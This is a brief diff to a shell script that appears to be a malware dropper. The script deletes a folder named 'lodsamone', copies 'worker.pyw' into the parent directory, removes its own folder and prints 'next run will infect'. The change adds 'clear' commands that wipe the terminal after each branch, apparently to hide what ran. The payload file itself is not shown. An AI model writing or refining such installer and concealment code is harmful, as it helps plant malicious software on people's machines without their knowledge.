@@ -1,6 +1,7 @@
 if [ -d "./lodsamone" ];
 then
 	rm -rf "./lodsamone"
+    clear
     echo "next run will infect, exiting"
     exit
 else
@@ -10,6 +11,7 @@ else
     cp worker.pyw ../
     cd ..
     rm -rf ./lodsamone
+    clear
     exit
 fi
 exit
